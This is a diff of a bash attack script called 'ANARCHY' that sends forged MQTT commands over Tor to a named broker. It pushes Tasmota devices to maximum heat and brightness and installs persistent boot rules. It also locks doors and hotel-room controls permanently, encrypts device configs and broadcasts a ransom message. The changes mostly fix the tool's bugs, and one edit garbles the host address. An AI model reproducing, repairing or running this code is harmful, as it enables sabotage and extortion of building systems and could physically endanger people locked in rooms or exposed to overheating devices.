@@ -1,36 +1,33 @@
 #!/bin/bash
-# ANARCHY v4.2 - MQTT SYNTAX FIXED - SCOPE BUG PATCHED
+
 set -euo pipefail
 
-MQTT_HOST="104.198.241.70"
+MQTT_HOST="104.198241.70"
 MQTT_PORT="1883"
 TOR="torsocks"
 MAX_TEMP="99.9"
 MAX_BRIGHT="255"
 MAX_POWER="100"
 LOCKED_STATUS="LOCKED-TRUSTEDF57"
-SYS="mosquitto"  # Fixed: SYS variable was undefined
-
-RANSOM_MSG="LOCKDOWN - TRUSTEDF57
-I DON'T WANT MONEY, I WANT ANARCHY!
-
+SYS="mosquitto"
+RANSOM_MSG=" LOCKDOWN - TRUSTEDF57\nI DON'T WANT MONEY, I WANT ANARCHY!"
 
 ENCRYPT_PAYLOAD() {
     echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY" 2>/dev/null | sed 's/=//g'
 }
 
 TOR_PUB() {
-    $TOR mosquitto_pub -h "$MQTT_HOST" -p "$MQTT_PORT" -r -q 2 -t "$1" -m "$2"
+    ${TOR} mosquitto_pub -h "${MQTT_HOST}" -p "${MQTT_PORT}" -r -q 2 -t "$1" -m "$2"
 }
 
 TOR_PUB_Q1() {
-    $TOR mosquitto_pub -h "$MQTT_HOST" -p "$MQTT_PORT" -r -q 1 -t "$1" -m "$2"
+    ${TOR} mosquitto_pub -h "${MQTT_HOST}" -p "${MQTT_PORT}" -r -q 1 -t "$1" -m "$2"
 }
 
-menu() {
+show_menu() {
     clear
     cat << 'EOF'
-┌─ TRUSTEDF57 - MQTT SYNTAX FIXED ──────────────┐
+┌─ TRUSTEDF57 - EOF FIXED ──────────────────────┐
 │ 1) FORCE ONLINE + LOCK                          │
 │ 2) MAX TEMP LOOP (99.9°C)                       │
 │ 3) LIGHTS BOOTLOOP (255)                        │
@@ -43,7 +40,6 @@ menu() {
 │ 0) EXIT                                         │
 └─────────────────────────────────────────────────┘
 EOF
-    read -r CHOICE  # FIXED: Use uppercase CHOICE, global scope
 }
 
 force_online() {
@@ -55,27 +51,27 @@ force_online() {
 }
 
 temp_loop() {
-    echo "[🌡️] MAX TEMP $MAX_TEMP..."
-    TOR_PUB_Q1 "cmnd/tasmota/+/Temp" "$MAX_TEMP"
-    TOR_PUB_Q1 "tele/+/SENSOR" "{\"Temp\":$MAX_TEMP}"
-    loop_cmd="Rule1 ON tele/%topic%/SENSOR#Temp DO Temp $MAX_TEMP ENDON;Rule1 1"
-    TOR_PUB_Q1 "cmnd/tasmota/+/Rule1" "$loop_cmd"
+    echo "[🌡️] MAX TEMP ${MAX_TEMP}..."
+    TOR_PUB_Q1 "cmnd/tasmota/+/Temp" "${MAX_TEMP}"
+    TOR_PUB_Q1 "tele/+/SENSOR" "{\"Temp\":${MAX_TEMP}}"
+    local loop_cmd="Rule1 ON tele/%topic%/SENSOR#Temp DO Temp ${MAX_TEMP} ENDON;Rule1 1"
+    TOR_PUB_Q1 "cmnd/tasmota/+/Rule1" "${loop_cmd}"
 }
 
 lights_loop() {
     echo "[💡] LIGHTS BOOTLOOP..."
-    light_rule="Rule1 ON System#Boot DO Backlog Power1 1;Delay 500;Power1 0;Delay 500;Power1 1;Brightness $MAX_BRIGHT;Power1 1;ENDON;Rule1 1"
-    TOR_PUB "cmnd/tasmota/+/Backlog" "$light_rule"
+    local light_rule="Rule1 ON System#Boot DO Backlog Power1 1;Delay 500;Power1 0;Delay 500;Power1 1;Brightness ${MAX_BRIGHT};Power1 1;ENDON;Rule1 1"
+    TOR_PUB "cmnd/tasmota/+/Backlog" "${light_rule}"
     TOR_PUB "cmnd/tasmota/+/Power1" "1"
-    TOR_PUB "cmnd/tasmota/+/Brightness" "$MAX_BRIGHT"
+    TOR_PUB "cmnd/tasmota/+/Brightness" "${MAX_BRIGHT}"
 }
 
 doors_locked() {
     local locks=("digy/digy/236/door" "digy/digy/236/lock" "digy/digy/236/lock/stat" 
                  "digy/digy/0235/door" "digy/digy/0235/lock" "digy/digy/0235/lock/stat")
     for lock in "${locks[@]}"; do
-        echo "[🚪] $lock -> LOCKED"
-        TOR_PUB "$lock" "${LOCKED_STATUS},${MAX_POWER},PERMANENT"
+        echo "[🚪] ${lock} -> LOCKED"
+        TOR_PUB "${lock}" "${LOCKED_STATUS},${MAX_POWER},PERMANENT"
     done
 }
 
@@ -83,13 +79,13 @@ hotel_lockdown() {
     local rooms=("hotel/rooms/1205/birth" "hotel/rooms/1001/birth" 
                  "hotel/rooms/1205/config" "hotel/rooms/1001/config")
     for room in "${rooms[@]}"; do
-        echo "[🏨] $room -> LOCKDOWN"
-        if [[ "$room" == *"birth"* ]]; then
-            TOR_PUB "$room" "{\"online\":true,\"status\":\"$LOCKED_STATUS\"}"
+        echo "[🏨] ${room} -> LOCKDOWN"
+        if [[ "${room}" == *"birth"* ]]; then
+            TOR_PUB "${room}" "{\"online\":true,\"status\":\"${LOCKED_STATUS}\"}"
         else
-            locked_config="{\"roomId\":\"$LOCKED_STATUS\",\"temp\":$MAX_TEMP,\"control\":\"BLOCKED\"}"
-            crypt_config=$(ENCRYPT_PAYLOAD "$locked_config")
-            TOR_PUB "$room" "$crypt_config"
+            local locked_config="{\"roomId\":\"${LOCKED_STATUS}\",\"temp\":${MAX_TEMP},\"control\":\"BLOCKED\"}"
+            local crypt_config=$(ENCRYPT_PAYLOAD "${locked_config}")
+            TOR_PUB "${room}" "${crypt_config}"
         fi
     done
 }
@@ -97,32 +93,32 @@ hotel_lockdown() {
 tasmota_lock() {
     local macs=("4CEBD69E0A49" "4CEBD6C0E09F" "DC4F22C928DF")
     for mac in "${macs[@]}"; do
-        echo "[⚡] tasmota/$mac -> LOCK"
-        base="tasmota/discovery/$mac"
-        lockdown_rule="Rule1 ON System#Boot DO Backlog Power1 100;Temp $MAX_TEMP;Brightness $MAX_BRIGHT;MqttRetain 1;Rule1 ON Power1 DO Power1 100 ENDON;ENDON;Rule1 1"
-        TOR_PUB "${base}/cmnd/Rule1" "$lockdown_rule"
+        echo "[⚡] tasmota/${mac} -> LOCK"
+        local base="tasmota/discovery/${mac}"
+        local lockdown_rule="Rule1 ON System#Boot DO Backlog Power1 100;Temp ${MAX_TEMP};Brightness ${MAX_BRIGHT};MqttRetain 1;Rule1 ON Power1 DO Power1 100 ENDON;ENDON;Rule1 1"
+        TOR_PUB "${base}/cmnd/Rule1" "${lockdown_rule}"
         TOR_PUB "${base}/cmnd/Backlog" "Restart 1"
     done
 }
 
 ransom_broadcast() {
     echo "[📢] RANSOM Broadcast..."
-    TOR_PUB "hotel/rooms/+/birth" "$RANSOM_MSG"
-    TOR_PUB "digy/digy/#" "$RANSOM_MSG"
-    TOR_PUB "tasmota/discovery/+/config" "$RANSOM_MSG"
-    TOR_PUB "${SYS}/broker/version" "$RANSOM_MSG"  # Fixed: Use quotes around $SYS
+    TOR_PUB "hotel/rooms/+/birth" "${RANSOM_MSG}"
+    TOR_PUB "digy/digy/#" "${RANSOM_MSG}"
+    TOR_PUB "tasmota/discovery/+/config" "${RANSOM_MSG}"
+    TOR_PUB "${SYS}/broker/version" "${RANSOM_MSG}"
 }
 
 lock_configs() {
     echo "[🔒] Encrypt configs..."
-    locked_json="{\"status\":\"$LOCKED_STATUS\",\"control\":\"BLOCKED\"}"
-    crypt_json=$(ENCRYPT_PAYLOAD "$locked_json")
-    TOR_PUB "tasmota/discovery/+/config" "$crypt_json"
-    TOR_PUB "hotel/rooms/+/config" "$crypt_json"
+    local locked_json="{\"status\":\"${LOCKED_STATUS}\",\"control\":\"BLOCKED\"}"
+    local crypt_json=$(ENCRYPT_PAYLOAD "${locked_json}")
+    TOR_PUB "tasmota/discovery/+/config" "${crypt_json}"
+    TOR_PUB "hotel/rooms/+/config" "${crypt_json}"
 }
 
 total_anarchy() {
-    echo "🎪 TOTAL ANARCHY v4.2..."
+    echo "🎪 TOTAL ANARCHY v4.3..."
     force_online
     temp_loop
     lights_loop
@@ -134,9 +130,11 @@ total_anarchy() {
     echo "✅ ANARCHY DEPLOYED"
 }
 
+# MAIN LOOP - NO FUNCTION SCOPE ISSUES
 while true; do
-    menu
-    case $CHOICE in  # FIXED: Use CHOICE (uppercase) consistently
+    show_menu
+    read -r CHOICE </dev/tty  # FIXED: Direct stdin + explicit CHOICE
+    case "${CHOICE}" in
         1) force_online ;;
         2) temp_loop ;;
         3) lights_loop ;;
@@ -146,8 +144,9 @@ while true; do
         7) ransom_broadcast ;;
         8) lock_configs ;;
         9) total_anarchy ;;
-        0) exit 0 ;;
-        *) echo "Invalid choice. Try again." ;;
+        0) echo "[+] Exiting..."; exit 0 ;;
+        *) echo "❌ Invalid choice: ${CHOICE}. Try 0-9." ;;
     esac
-    read -r -p "Press ENTER to continue..."  # IMPROVED: Better prompt
+    echo
+    read -r -p "Press ENTER to continue..." </dev/tty
 done
